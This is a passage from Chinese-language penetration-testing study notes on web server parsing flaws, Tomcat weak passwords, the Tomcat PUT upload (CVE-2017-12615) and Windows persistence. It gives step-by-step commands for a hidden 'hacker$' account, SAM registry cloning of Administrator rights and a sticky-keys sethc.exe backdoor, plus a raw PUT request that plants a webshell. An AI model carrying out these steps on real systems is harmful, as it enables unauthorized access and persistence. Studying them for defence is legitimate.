<p>查看 <code v-pre>index.php</code> 文件中的 <code v-pre>php</code> 源码</p>
<div class="language-php line-numbers-mode" data-ext="php"><pre v-pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 漏洞成因。 不会过滤 name 中的 \n， 造成解析漏洞</span>
        <span class="token comment">// $name = basename($_FILES['file']['name']); // 会过滤 name 中的 \n， 无法造成漏洞</span>
        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php3'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'phtml'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pht'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bad file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">move_upload_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'./'</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token comment">// 上传文件的 form</span>
    <span class="token punctuation">}</span>
<span class="token delimiter important">?></span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p>关于 Windows 和 Linux</p>
<blockquote>
<p>这个漏洞只能在 Linux 操作系统下正常利用，因为在 Windows 系统中，涉及到文件读写，操作系统是不允许后缀名以换行符结尾的，所以创建文件会失败，出现 warning 警告。</p>
</blockquote>
</li>
</ol>
<p>漏洞复现</p>
<ol>
<li>burp 抓包，在 hex 编码中的文件名后添加 <code v-pre>0a</code>十六进制码</li>
<li>重发请求包</li>
</ol>
<p>漏洞修复</p>
<ul>
<li>升级 Apache HTTPD 版本</li>
<li>将上传的文件重命名为 &quot;随机+后缀&quot; 的格式并禁用上传文件目录执行脚本权限</li>
<li>获取文件名时手动过滤换行符或使用 <code v-pre>$_FILES['file']['name']</code> 获取文件名</li>
<li>在 <code v-pre>httpd.conf</code> 中加入其它正则表达式加强校验规则</li>
</ul>
<h3 id="php-cgi-解析漏洞" tabindex="-1"><a class="header-anchor" href="#php-cgi-解析漏洞" aria-hidden="true">#</a> PHP CGI 解析漏洞</h3>
<h5 id="漏洞简介-1" tabindex="-1"><a class="header-anchor" href="#漏洞简介-1" aria-hidden="true">#</a> 漏洞简介</h5>
<blockquote>
<p>例如 <code v-pre>http://www.xxx.com/x.jpg/x.php</code> 解析的时候，如果 <code v-pre>x.php</code> 不存在， <code v-pre>php</code> 就会向前解析，如果 <code v-pre>x.jpg</code> 存在，就会把 <code v-pre>x.jpg</code> 当做 <code v-pre>php</code> 文件解析，从而产生漏洞。</p>
</blockquote>
<h5 id="漏洞原理-1" tabindex="-1"><a class="header-anchor" href="#漏洞原理-1" aria-hidden="true">#</a> 漏洞原理</h5>
<ol>
<li>首先先了解 <code v-pre>php</code> 和 <code v-pre>apache</code> 的三种结合方式：
<ol>
<li><code v-pre>Module</code> 模式： <code v-pre>php</code> 作为 <code v-pre>apache</code> 的模块，<code v-pre>php</code> 进程和 <code v-pre>apache</code> 进程合在一块</li>
<li><code v-pre>CGI</code> 模式： <code v-pre>CGI</code> 一般是可执行程序，例如 <code v-pre>exe</code> 文件，每次都 <code v-pre>fork</code> 一个进程来运行外部的 <code v-pre>exe</code> 文件，并且只能处理一个用户请求，处理完成后就会退出，当用户请求数量非常多时，会频繁的 <code v-pre>fork</code> 进程和退出进程，占用大量系统的资源，效能低下，每次 <code v-pre>fork</code> <code v-pre>php</code> 进程独立运行处理。</li>
<li><code v-pre>FastCGI</code> 模式： 在 <code v-pre>web</code> 服务器启动的时候，<code v-pre>FastCGI</code> 处理进程就开启而且不会退出，接收到请求后，服务器通过 <code v-pre>TCP</code> 或者本地 <code v-pre>socket</code> 直接把内容传递给 <code v-pre>FastCGI</code> 进程，常驻内存不需要每次都 <code v-pre>fork</code> 进程</li>
</ol>
</li>
<li><code v-pre>PHP</code> 配置文件中有一个参数是 <code v-pre>cgi.fix_pathinfo</code>， 如果参数 <code v-pre>cgi.fix_pathinfo=1</code>，则产生漏洞</li>
<li><code v-pre>location</code> 对请求进行选择的时候会使用 <code v-pre>URI</code> 环境变量进行选择，其中传递到后端 <code v-pre>Fastcgi</code> 的关键变量 <code v-pre>SCRIPT_FILENAME</code> 由 <code v-pre>nginx</code> 生成的 <code v-pre>$fastcgi_script_name</code> 决定，而通过分析可以看到 <code v-pre>$fastcgi_script_name</code> 是直接由 <code v-pre>URI</code> 环境变量控制的，这里就是产生问题的点。而为了较好的支持 <code v-pre>PATH_INFO</code> 的提取，在 <code v-pre>PHP</code> 的配置选项里存在 <code v-pre>cgi.fix_pathinfo</code> 选项，其目的是为了从 <code v-pre>SCRIPT_FILENAME</code> 里面取出真正的脚本名。</li>
</ol>
<h5 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h5>
<ol>
<li>打开 <code v-pre>php.ini</code> 配置文件，将 <code v-pre>cgi.fix_pathinfo</code> 的值配置为 <code v-pre>1</code></li>
<li>尝试访问 <code v-pre>http://127.0.0.1/phpinfo.php/1.jpg</code></li>
</ol>
<ul>
<li><code v-pre>phpinfo.php</code> 存在，<code v-pre>1.jpg</code> 也存在时，<code v-pre>1.jpg</code> 会被当做 <code v-pre>php</code> 文件解析，漏洞产生。</li>
<li><code v-pre>phpinfo.php</code> 存在， <code v-pre>1.jpg</code> 不存在时，会向前解析 <code v-pre>phpinfo.php</code></li>
</ul>
<h3 id="iis6-0-解析漏洞" tabindex="-1"><a class="header-anchor" href="#iis6-0-解析漏洞" aria-hidden="true">#</a> IIS6.0 解析漏洞</h3>
<h3 id="iis7-x-解析漏洞" tabindex="-1"><a class="header-anchor" href="#iis7-x-解析漏洞" aria-hidden="true">#</a> IIS7.x 解析漏洞</h3>
<h5 id="漏洞简介-2" tabindex="-1"><a class="header-anchor" href="#漏洞简介-2" aria-hidden="true">#</a> 漏洞简介</h5>
<ol>
<li><code v-pre>IIS 7.x</code> 在解析 <code v-pre>asp</code> 文件时不存在解析漏洞</li>
<li><code v-pre>IIS 7.x</code> 在解析 <code v-pre>php</code> 文件时，如果 <code v-pre>php</code> 配置文件中 <code v-pre>cgi.fix_patchinfo=1</code>， 就会产生解析漏洞。如： <code v-pre>http://www.xxx.com/x.jpg/x.php</code> ，如果 <code v-pre>x.php</code> 不存在，<code v-pre>php</code> 就会向前解析，如果 <code v-pre>x.jpg</code> 存在，就会将 <code v-pre>x.jpg</code> 当做 <code v-pre>php</code> 文件解析，从而产生漏洞</li>
</ol>
<h3 id="nginx-解析漏洞" tabindex="-1"><a class="header-anchor" href="#nginx-解析漏洞" aria-hidden="true">#</a> Nginx 解析漏洞</h3>
<h3 id="iis-漏洞详解" tabindex="-1"><a class="header-anchor" href="#iis-漏洞详解" aria-hidden="true">#</a> IIS 漏洞详解</h3>
<h3 id="apache-漏洞详解" tabindex="-1"><a class="header-anchor" href="#apache-漏洞详解" aria-hidden="true">#</a> Apache 漏洞详解</h3>
<h5 id="apache-常见漏洞" tabindex="-1"><a class="header-anchor" href="#apache-常见漏洞" aria-hidden="true">#</a> Apache 常见漏洞</h5>
<ul>
<li>Apache APISIX 默认密钥漏洞</li>
<li>Apache HTTPD 换行解析漏洞</li>
<li>Apache HTTP Server 2.4.48 mod_proxy SSRF 漏洞</li>
<li>Apache HTTP Server 2.4.49 路径穿越漏洞</li>
<li>Apache HTTP Server 2.4.50 路径穿越漏洞</li>
<li>Apache HTTPD 未知后缀名解析漏洞</li>
<li>Apache SSI 远程命令执行漏洞</li>
<li>Apache Flink 文件上传漏洞</li>
<li>Apache Flink jobmanager/logs 目录穿越漏洞</li>
<li>Apache Jmeter RMI 反序列化命令执行漏洞（CVE-2018-1297）</li>
<li>Apache Log4j Server 反序列化命令执行漏洞</li>
<li>Apache Log4j2 lookup JNDI 注入漏洞</li>
<li>Apache OfBiz 反序列化命令执行漏洞</li>
<li>Apache Shiro 1.2.4 反序列化漏洞</li>
<li>Apache Shiro 认证绕过漏洞</li>
<li>Apache Skywalking 8.3.0 SQL 注入漏洞</li>
<li>Apache solr XML 实体注入漏洞</li>
<li>Apache solr 远程命令执行漏洞</li>
<li>Apache solr Velocity 注入远程命令执行漏洞</li>
<li>Apache solr RemoteStreaming 文件读取与 SSRF 漏洞</li>
<li>Apache Spark 未授权访问漏洞</li>
<li>Apache Tomcat AJP 文件包含漏洞</li>
<li>Apache Unomi 远程表达式代码执行漏洞</li>
</ul>
<h3 id="tomcat-漏洞详解" tabindex="-1"><a class="header-anchor" href="#tomcat-漏洞详解" aria-hidden="true">#</a> Tomcat 漏洞详解</h3>
<blockquote>
<p>Tomcat 是 Apache 软件基金会的 Jakarta 项目中的一个核心项目。</p>
<p>Tomcat 服务器是一个免费的开源 Web 应用服务器，属于轻量级应用服务器，应用十分广泛。</p>
</blockquote>
<h5 id="tomcat-常见的漏洞" tabindex="-1"><a class="header-anchor" href="#tomcat-常见的漏洞" aria-hidden="true">#</a> Tomcat 常见的漏洞</h5>
<ul>
<li>Tomcat AJP 文件包含漏洞</li>
<li>Tomcat 弱口令</li>
<li>Tomcat 反序列化漏洞（CVE-2016-8735）</li>
<li>Tomcat 本地提权漏洞（CVE-2016-1240）</li>
<li>Tomcat JMX 服务弱口令</li>
<li>Tomcat Put 上传漏洞（CVE-2017-12615）</li>
<li>Tomcat Win 版本默认空口令</li>
<li>Tomcat 样例目录 session 操控漏洞</li>
</ul>
<h5 id="tomcat-弱口令" tabindex="-1"><a class="header-anchor" href="#tomcat-弱口令" aria-hidden="true">#</a> Tomcat 弱口令</h5>
<h6 id="漏洞介绍" tabindex="-1"><a class="header-anchor" href="#漏洞介绍" aria-hidden="true">#</a> 漏洞介绍</h6>
<blockquote>
<p><code v-pre>Tomcat</code> 存在管理后台用来进行应用部署管理，并且管理后台使用的是 HTTP 基础认证进行登录。如果用户口令为弱口令，攻击者可以轻易的进行爆破登录后台并进行应用管理。 <code v-pre>Tomcat</code> 支持在后台部署 <code v-pre>war</code> 文件，可以直接将 <code v-pre>webshell</code> 部署到 <code v-pre>web</code> 目录下。</p>
</blockquote>
<h6 id="漏洞原理-2" tabindex="-1"><a class="header-anchor" href="#漏洞原理-2" aria-hidden="true">#</a> 漏洞原理</h6>
<p>在 <code v-pre>Tomcat</code> 配置文件中存在错口令</p>
<div class="language-xml line-numbers-mode" data-ext="xml"><pre v-pre class="language-xml"><code>cd /usr/local/tomcat/conf
cat tomcat-users.xml
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-xml line-numbers-mode" data-ext="xml"><pre v-pre class="language-xml"><code><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tomcat-users</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://tomcat.apache.org/xml<span class="token punctuation">"</span></span>
              <span class="token attr-name">...</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role</span> <span class="token attr-name">rolename</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>manager-gui<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role</span> <span class="token attr-name">rolename</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>manager-script<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role</span> <span class="token attr-name">rolename</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>manager-status<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span> <span class="token attr-name">username</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tomcat<span class="token punctuation">"</span></span> <span class="token attr-name">password</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tomcat<span class="token punctuation">"</span></span> <span class="token attr-name">roles</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>manager-gui, manager-script<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tomcat-users</span><span class="token punctuation">></span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="漏洞复现-1" tabindex="-1"><a class="header-anchor" href="#漏洞复现-1" aria-hidden="true">#</a> 漏洞复现</h6>
<ol>
<li>打开漏洞网页环境（<code v-pre>Tomcat 首页</code>）</li>
<li>点击右侧 <code v-pre>Manager App</code> 按钮进入管理后台，会提示输入用户名和密码（如果这里是弱口令，就可以被爆破）</li>
<li>进入管理后台后，找到 <code v-pre>war file to deploy</code> 模块，这里可以上传任务 <code v-pre>war</code> 文件并部署
<ol>
<li>写一个一句话木马 <code v-pre>shell.jsp</code></li>
<li>生成 <code v-pre>war</code> 包。 <code v-pre>jar cvf shell.war shell.jsp</code></li>
<li>将生成的 <code v-pre>war</code> 包上传并部署</li>
</ol>
</li>
<li>访问一句话木马（<code v-pre>http://xxx.xxx.xxx.xxx/shell/shell.jsp</code>）。</li>
<li>使用远程交互工具，连接一句话木马。</li>
</ol>
<h5 id="tomcat-put-上传" tabindex="-1"><a class="header-anchor" href="#tomcat-put-上传" aria-hidden="true">#</a> Tomcat Put 上传</h5>
<h6 id="漏洞简介-3" tabindex="-1"><a class="header-anchor" href="#漏洞简介-3" aria-hidden="true">#</a> 漏洞简介</h6>
<blockquote>
<p><code v-pre>CVE-2017-12615</code> 任意文件写入漏洞，是由于 <code v-pre>Tomcat</code> 配置不当，导致可以使用 <code v-pre>PUT</code> 方式上传任意文件</p>
</blockquote>
<h6 id="漏洞原理-3" tabindex="-1"><a class="header-anchor" href="#漏洞原理-3" aria-hidden="true">#</a> 漏洞原理</h6>
<p>在 <code v-pre>Tomcat</code> 配置文件中设置了 <code v-pre>PUT</code> 上传方法，在  <code v-pre>web.xml</code> 文件中，默认 <code v-pre>readonly</code> 的值为 <code v-pre>true</code>， 当 <code v-pre>readonly</code> 设置为 <code v-pre>false</code> 时，可以通过 <code v-pre>PUT/DELETE</code> 进行文件操控，从而产生漏洞。</p>
<h6 id="漏洞复现-2" tabindex="-1"><a class="header-anchor" href="#漏洞复现-2" aria-hidden="true">#</a> 漏洞复现</h6>
<ol>
<li>
<p>打开漏洞网页环境（<code v-pre>Tomcat</code> 首页）</p>
</li>
<li>
<p>打开 <code v-pre>BP</code>， 发送 <code v-pre>PUT</code> 数据包（由于 <code v-pre>Tomcat</code> 的默认限制，可能无法直接发送 <code v-pre>.jsp</code> 文件，但是可以通过 <code v-pre>Linux</code> 的特性，如加 <code v-pre>/</code> 来绕过）</p>
<div class="language-xml line-numbers-mode" data-ext="xml"><pre v-pre class="language-xml"><code>PUT /1.jsp/ HTTP/1.1
Host: ip:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

一句话木马
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p>访问一句话木马（<code v-pre>http://xxx.xxx.xxx/1.jsp</code>）</p>
</li>
<li>
<p>使用远程交互攻击，连接一句话木马</p>
</li>
</ol>
<h3 id="weblogic-漏洞详解" tabindex="-1"><a class="header-anchor" href="#weblogic-漏洞详解" aria-hidden="true">#</a> WebLogic 漏洞详解</h3>
<h5 id="weblogic-常见漏洞" tabindex="-1"><a class="header-anchor" href="#weblogic-常见漏洞" aria-hidden="true">#</a> WebLogic 常见漏洞</h5>
<ul>
<li>WebLogic 控制台路径泄露</li>
<li>WebLogic 弱口令</li>
<li>WebLogic SSRF（CVE-2014-4210）</li>
<li>WebLogic 反序列化（CVE-2015-4852）</li>
<li>WebLogic 反序列化（CVE-2016-0638）</li>
<li>WebLogic 反序列化（CVE-2016-3510）</li>
<li>WebLogic 反序列化（CVE-2017-3248）</li>
<li>WebLogic 反序列化（CVE-2018-2628）</li>
<li>WebLogic 反序列化（CVE-2018-2893）</li>
<li>WebLogic 反序列化（CVE-2018-2894）</li>
<li>WebLogic XMLDecoder 反序列化（CVE-2017-10271）</li>
<li>WebLogic XMLDecoder 反序列化（CVE-2017-3506）</li>
<li>WebLogic 未授权访问（CVE-2020-14883）</li>
</ul>
<h3 id="jboss-漏洞详解" tabindex="-1"><a class="header-anchor" href="#jboss-漏洞详解" aria-hidden="true">#</a> JBoss 漏洞详解</h3>
<h3 id="ngnix-漏洞详解" tabindex="-1"><a class="header-anchor" href="#ngnix-漏洞详解" aria-hidden="true">#</a> Ngnix 漏洞详解</h3>
<h2 id="反序列化漏洞" tabindex="-1"><a class="header-anchor" href="#反序列化漏洞" aria-hidden="true">#</a> 反序列化漏洞</h2>
<h3 id="反序列化介绍" tabindex="-1"><a class="header-anchor" href="#反序列化介绍" aria-hidden="true">#</a> 反序列化介绍</h3>
<h3 id="序列化与反序列化" tabindex="-1"><a class="header-anchor" href="#序列化与反序列化" aria-hidden="true">#</a> 序列化与反序列化</h3>
<h3 id="php-魔法函数介绍" tabindex="-1"><a class="header-anchor" href="#php-魔法函数介绍" aria-hidden="true">#</a> PHP 魔法函数介绍</h3>
<h3 id="php-反序列化漏洞利用" tabindex="-1"><a class="header-anchor" href="#php-反序列化漏洞利用" aria-hidden="true">#</a> PHP 反序列化漏洞利用</h3>
<h3 id="java-反序列化漏洞利用" tabindex="-1"><a class="header-anchor" href="#java-反序列化漏洞利用" aria-hidden="true">#</a> Java 反序列化漏洞利用</h3>
<h2 id="文件上传" tabindex="-1"><a class="header-anchor" href="#文件上传" aria-hidden="true">#</a> 文件上传</h2>
<h3 id="文件上传概述" tabindex="-1"><a class="header-anchor" href="#文件上传概述" aria-hidden="true">#</a> 文件上传概述</h3>
<h3 id="前端-js-文件上传绕过" tabindex="-1"><a class="header-anchor" href="#前端-js-文件上传绕过" aria-hidden="true">#</a> 前端 JS 文件上传绕过</h3>
<h3 id="白名单文件上传绕过" tabindex="-1"><a class="header-anchor" href="#白名单文件上传绕过" aria-hidden="true">#</a> 白名单文件上传绕过</h3>
<h3 id="黑名单文件上传绕过" tabindex="-1"><a class="header-anchor" href="#黑名单文件上传绕过" aria-hidden="true">#</a> 黑名单文件上传绕过</h3>
<h3 id="条件竞争文件上传绕过" tabindex="-1"><a class="header-anchor" href="#条件竞争文件上传绕过" aria-hidden="true">#</a> 条件竞争文件上传绕过</h3>
<h3 id="文件上传防护" tabindex="-1"><a class="header-anchor" href="#文件上传防护" aria-hidden="true">#</a> 文件上传防护</h3>
<h2 id="文件包含" tabindex="-1"><a class="header-anchor" href="#文件包含" aria-hidden="true">#</a> 文件包含</h2>
<h3 id="文件包含概述" tabindex="-1"><a class="header-anchor" href="#文件包含概述" aria-hidden="true">#</a> 文件包含概述</h3>
<h3 id="文件包含漏洞利用" tabindex="-1"><a class="header-anchor" href="#文件包含漏洞利用" aria-hidden="true">#</a> 文件包含漏洞利用</h3>
<h3 id="php-为协议详解" tabindex="-1"><a class="header-anchor" href="#php-为协议详解" aria-hidden="true">#</a> PHP 为协议详解</h3>
<h3 id="文件包含防护" tabindex="-1"><a class="header-anchor" href="#文件包含防护" aria-hidden="true">#</a> 文件包含防护</h3>
<h2 id="wireshark-使用和分析" tabindex="-1"><a class="header-anchor" href="#wireshark-使用和分析" aria-hidden="true">#</a> Wireshark 使用和分析</h2>
<h3 id="wireshark-介绍" tabindex="-1"><a class="header-anchor" href="#wireshark-介绍" aria-hidden="true">#</a> Wireshark 介绍</h3>
<blockquote>
<p>Wireshark 是一个网络封包分析软件。功能是截取网络封包，并尽可能的显示出最为详细的网络封包资料。</p>
<p>Wireshark 使用 WinPCAP 作为借口，直接与网卡进行数据报文交换</p>
<p>Wireshark 在支持协议的数量方面出类拔萃，截止目前已提供了超过 850 种协议的支持。这些协议包括从最基础的 IP 协议和 DHCP 协议到高级的专用协议，比如 <code v-pre>ApleTalk</code> 和 <code v-pre>BitTorrent</code> 等。由于 Wireshark 在开源模式下进行开发，所以每次更新都会增加一些对协议的支持。</p>
</blockquote>
<h4 id="wireshark-的主要功能" tabindex="-1"><a class="header-anchor" href="#wireshark-的主要功能" aria-hidden="true">#</a> Wireshark 的主要功能</h4>
<ol>
<li>实时抓取数据包（抓包模块）</li>
<li>对已获取的数据包进行流量分析（分析模块）</li>
</ol>
<h4 id="wireshark-的界面介绍" tabindex="-1"><a class="header-anchor" href="#wireshark-的界面介绍" aria-hidden="true">#</a> Wireshark 的界面介绍</h4>
<ol>
<li>
<p>分组列表</p>
<p>流量信息的基本信息（时间、源IP、目标IP、协议、长度、简述等）</p>
</li>
<li>
<p>分组详情</p>
<p>流量信息的 <code v-pre>TCP/IP</code> 5 层模型形式</p>
<ul>
<li>物理层</li>
<li>数据链路层（MAC）</li>
<li>网络层（IP）</li>
<li>传输层（PORT）</li>
<li>应用层</li>
</ul>
</li>
<li>
<p>分组字节流</p>
<p>流量信息的十六进制形式</p>
</li>
</ol>
<h3 id="wireshark-分析步骤" tabindex="-1"><a class="header-anchor" href="#wireshark-分析步骤" aria-hidden="true">#</a> Wireshark 分析步骤</h3>
<h3 id="web-攻击流量分析" tabindex="-1"><a class="header-anchor" href="#web-攻击流量分析" aria-hidden="true">#</a> Web 攻击流量分析</h3>
<h3 id="webshell-通信流量分析" tabindex="-1"><a class="header-anchor" href="#webshell-通信流量分析" aria-hidden="true">#</a> Webshell 通信流量分析</h3>
<h2 id="权限维持" tabindex="-1"><a class="header-anchor" href="#权限维持" aria-hidden="true">#</a> 权限维持</h2>
<h3 id="windows-权限维持" tabindex="-1"><a class="header-anchor" href="#windows-权限维持" aria-hidden="true">#</a> Windows 权限维持</h3>
<h4 id="用户维持" tabindex="-1"><a class="header-anchor" href="#用户维持" aria-hidden="true">#</a> 用户维持</h4>
<h5 id="隐藏账户维持" tabindex="-1"><a class="header-anchor" href="#隐藏账户维持" aria-hidden="true">#</a> 隐藏账户维持</h5>
<p><strong>隐藏账户</strong>就是计算机下通过<strong>一般查看方式</strong>看不到的账户。</p>
<h6 id="使用-符号隐藏账户" tabindex="-1"><a class="header-anchor" href="#使用-符号隐藏账户" aria-hidden="true">#</a> 使用 <code v-pre>$</code> 符号隐藏账户</h6>
<p><code v-pre>$</code> 符号隐藏账户，就是在用户名后面添加 <code v-pre>$</code> 符号（如： <code v-pre>hacker$</code>）来达到简单隐藏账户的目的</p>
<ol>
<li>查看当前操作系统下的账户列表</li>
</ol>
<blockquote>
<p><code v-pre>net user</code></p>
</blockquote>
<ol start="2">
<li>创建一个隐藏账户</li>
</ol>
<blockquote>
<p><code v-pre>net user hacker$ Admin@123 /add</code></p>
</blockquote>
<ol start="3">
<li>查看当前操作系统下的账户列表</li>
</ol>
<blockquote>
<p><code v-pre>net user</code></p>
</blockquote>
<ol start="4">
<li>在【控制面板-管理用户列表】或【计算机管理-本地用户和组】中都可以查看到</li>
</ol>
<h6 id="注册表克隆用户隐藏" tabindex="-1"><a class="header-anchor" href="#注册表克隆用户隐藏" aria-hidden="true">#</a> 注册表克隆用户隐藏</h6>
<p><strong>注册表隐藏</strong>是建立在已经存在隐藏账户的基础上（也就是上一步 <code v-pre>$</code> 隐藏账户之后）进一步的隐藏操作。</p>
<ol>
<li>
<p>打开注册表</p>
<p>进入 <code v-pre>HKEY_LOCAL_MACHINE\SAM\SAM\Domains|Account\Users\Names</code> 目录</p>
<p>如果 <code v-pre>SAM</code> 目录下无法继续展开，需要“右键”-“权限”赋予“Administrator”-“完全控制”权限</p>
</li>
<li>
<p>导出隐藏账户</p>
<p>选中隐藏账户（如 <code v-pre>hacker$</code>），“右键”-“导出”（保存为 <code v-pre>1.reg</code>）</p>
</li>
<li>
<p>注册表克隆账户</p>
<p>选中 <code v-pre>Administrator</code> 账户，其 <code v-pre>Value</code> 为一个十六进制数字（如：<code v-pre>3EB</code>），对应上一级目录（<code v-pre>Users</code>）下的一个目录名（如：<code v-pre>000003EB</code>，这里存储的是对应账号的权限二进制值），选中对应的目录，右侧会有两个 <code v-pre>Key</code>（<code v-pre>F</code> 和 <code v-pre>V</code>），双击打开 <code v-pre>F</code> 的二进制数值，全选，复制，替换到隐藏账户（如 <code v-pre>hacker$</code>）对应的 <code v-pre>F</code> 的二进制数值。</p>
</li>
<li>
<p>导出隐藏账户权限（已经被篡改，拥有被克隆账号的权限）</p>
<p>选中隐藏账户（如 <code v-pre>hacker$</code>）对应的上级目录，导出（保存为 <code v-pre>2.reg</code>）</p>
</li>
<li>
<p>删除隐藏账户</p>
<p><code v-pre>net user hacker$ /del</code></p>
</li>
<li>
<p>执行 <code v-pre>1.reg</code> 创建隐藏账户</p>
</li>
<li>
<p>执行 <code v-pre>2.reg</code> 为隐藏账户赋权</p>
</li>
<li>
<p>此时，除“注册表”与部分扫描工具之外，很难查看到 <code v-pre>hacker$</code> 账户</p>
</li>
</ol>
<h4 id="shift-后门维持" tabindex="-1"><a class="header-anchor" href="#shift-后门维持" aria-hidden="true">#</a> Shift 后门维持</h4>
<h5 id="windows-粘滞键" tabindex="-1"><a class="header-anchor" href="#windows-粘滞键" aria-hidden="true">#</a> Windows 粘滞键</h5>
<p><strong>Windows 粘滞键</strong>是 Windows 提供给不方便使用组合键的用户设计的功能。</p>
<p>在 Windows 系统中，连续按 5 下 <code v-pre>Shift</code> 键就会启动粘滞键。</p>
<p>粘滞键本身是调用 <code v-pre>C:\Windows\System32\sethc.exe</code> 程序。</p>
<p>此程序所运行的权限是当前登录用户，<strong>但是，当未登录系统（停留在登录界面）时，连续按 5 次粘滞键，系统将会以 <code v-pre>system</code> 账户来运行 <code v-pre>sethc.exe</code> 程序</strong>。</p>
<h5 id="shift-后门维持原理" tabindex="-1"><a class="header-anchor" href="#shift-后门维持原理" aria-hidden="true">#</a> Shift 后门维持原理</h5>
<p>备份 <code v-pre>sethc.exe</code> 程序，将 <code v-pre>cmd.exe</code> 程序更名为 <code v-pre>sethc.exe</code> ，在登录界面连续按 5 下 <code v-pre>Shift</code> 键，系统将会以 <code v-pre>system</code> 账户来打开 <code v-pre>cmd.exe</code></p>
<h5 id="shift-后门制作" tabindex="-1"><a class="header-anchor" href="#shift-后门制作" aria-hidden="true">#</a> Shift 后门制作</h5>
<ol>
<li>
<p>提升文件权限</p>
<p><code v-pre>takeown /f c:\window\system32\*.* /a /r /d y</code></p>
<p>强制将目录下所有文件及文件夹、子文件夹下的所有者更改为管理员组（<code v-pre>administrator</code>）</p>
<p><code v-pre>cacls c:\windows\system32\*.* /T /E /G administrators:F</code></p>
<p>在当前目录下的文件、子文件夹的 <code v-pre>NTFS</code> 权限上添加管理员组（<code v-pre>administrator</code>）的完全控制权限（并保留原有的 <code v-pre>NTFS</code> 权限设置）</p>
</li>
<li>
<p>复制 <code v-pre>cmd.exe</code> 为 <code v-pre>sethc.exe</code>（不提升权限有可能会提示拒绝访问）</p>
<p><code v-pre>copy c:\windows\system32 cmd.exe c:\windows\system32\sethc.exe</code></p>
</li>
<li>
<p>在登录界面，连按 5 下 <code v-pre>Shift</code> 键，即可以 <code v-pre>system</code> 账户打开终端</p>
</li>
</ol>
